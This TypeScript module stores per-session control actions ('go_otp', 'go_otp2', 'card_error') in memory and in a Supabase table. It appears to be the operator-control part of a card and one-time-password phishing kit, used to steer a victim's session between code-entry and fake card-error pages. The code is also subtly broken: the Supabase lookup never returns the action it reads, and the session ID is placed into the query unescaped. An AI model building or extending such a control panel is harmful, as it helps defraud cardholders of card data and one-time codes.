export type ControlAction = "go_otp" | "go_otp2" | "card_error";

interface ControlEntry {
  action: ControlAction;
  setAt: number;
}

const store = new Map<string, ControlEntry>();
const TTL_MS = 60 * 60 * 1000;

function cleanup() {
  const now = Date.now();
  for (const [key, entry] of store) {
    if (now - entry.setAt > TTL_MS) store.delete(key);
  }
}
setInterval(cleanup, 5 * 60 * 1000);

// Supabase integration for persistent control storage
let supabaseUrl = process.env.SUPABASE_URL || "";
let supabaseKey = process.env.SUPABASE_ANON_KEY || "";

export function setSupabaseConfig(url: string, key: string) {
  supabaseUrl = url;
  supabaseKey = key;
}

// Persist control to Supabase
async function persistControl(sessionId: string, action: ControlAction): Promise<void> {
  if (!supabaseUrl || !supabaseKey) return;
  
  try {
    const response = await fetch(`${supabaseUrl}/rest/v1/controls`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'apikey': supabaseKey,
        'Authorization': `Bearer ${supabaseKey}`,
      },
      body: JSON.stringify({
        session_id: sessionId,
        action: action,
        expires_at: new Date(Date.now() + TTL_MS).toISOString(),
      }),
    });
    
    if (response.ok) {
      console.log(`Control persisted to Supabase: ${sessionId} -> ${action}`);
    }
  } catch (error) {
    console.error('Failed to persist control to Supabase:', error);
  }
}

// Get control from Supabase (fallback when not in memory)
async function getControlFromSupabase(sessionId: string): Promise<ControlAction | null> {
  if (!supabaseUrl || !supabaseKey) return null;
  
  try {
    const response = await fetch(
      `${supabaseUrl}/rest/v1/controls?session_id=eq.${sessionId}&order=created_at.desc&limit=1`,
      {
        headers: {
          'apikey': supabaseKey,
          'Authorization': `Bearer ${supabaseKey}`,
        },
      }
    );
    
    if (!response.ok) return null;
    
    const jsonData = await response.json();
    const data = Array.isArray(jsonData) ? jsonData as any[] : [];
    if (data.length > 0) {
      const expiresAt = new Date(data[0].expires_at);
      if (expiresAt > new Date()) {
        const action = data[0].action as ControlAction;
        
        // Delete from Supabase immediately (consume once)
        fetch(`${supabaseUrl}/rest/v1/controls?session_id=eq.${sessionId}`, {
          method: 'DELETE',
          headers: {
            'apikey': supabaseKey,
            'Authorization': `Bearer ${supabaseKey}`,
          },
        }).catch(() => {});
      }
    }
  } catch (error) {
    console.error('Failed to get control from Supabase:', error);
  }
  
  return null;
}

export function setControl(sessionId: string, action: ControlAction): void {
  store.set(sessionId, { action, setAt: Date.now() });
  // Persist to Supabase for durability
  void persistControl(sessionId, action);
}

export function getControl(sessionId: string): ControlAction | null {
  // First check in-memory store
  const entry = store.get(sessionId);
  if (entry) {
    if (Date.now() - entry.setAt > TTL_MS) {
      store.delete(sessionId);
    } else {
      store.delete(sessionId);
      return entry.action;
    }
  }
  
  // Fallback to Supabase
  return null; // Will be handled async in the route handler
}

export async function getControlAsync(sessionId: string): Promise<ControlAction | null> {
  // First check in-memory store
  const entry = store.get(sessionId);
  if (entry) {
    if (Date.now() - entry.setAt > TTL_MS) {
      store.delete(sessionId);
    } else {
      store.delete(sessionId);
      return entry.action;
    }
  }
  
  // Fallback to Supabase
  return await getControlFromSupabase(sessionId);
}

export function peekControl(sessionId: string): ControlAction | null {
  const entry = store.get(sessionId);
  if (!entry) return null;
  return entry.action;
}
